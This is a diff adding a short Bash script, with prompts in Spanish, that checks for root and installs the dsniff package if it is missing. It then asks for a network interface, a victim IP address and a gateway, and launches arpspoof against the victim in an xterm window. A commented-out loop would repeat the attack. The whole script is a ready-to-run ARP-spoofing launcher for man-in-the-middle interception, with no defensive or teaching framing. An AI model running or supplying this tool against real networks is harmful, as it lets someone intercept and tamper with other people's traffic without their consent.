@@ -1,0 +1,34 @@
+#!/bin/bash
+
+if [[ $EUID -ne 0 ]]; then
+zenity --error --text="No Estas Como Root."
+exit 1
+else
+zenity --info --text="Estas Como Root Continuemos."
+fi
+
+arpspoof=/usr/share/dsniff/
+
+if [ -d $arpspoof ]; then
+sleep 1s
+zenity --info --text="arpspoof Ya Esta Instalado"
+else
+sleep 2s
+zenity --error --text="arpspoof No Esta Instalado"
+sudo apt-get install dsniff
+fi
+
+xterm -hold -e "ifconfig" &
+echo -n Nombre De La Tarjeta De Red : 
+read targeta
+echo -n Ip De La Victima : 
+read ip
+echo -n Gateway : 
+read gateway
+
+xterm -hold -e "arpspoof -i $targeta -t $ip $gateway" &
+
+#while true; do
+#xterm -hold -e "arpspoof -i $targeta -t $ip $gateway" &
+#sleep 10s
+#done
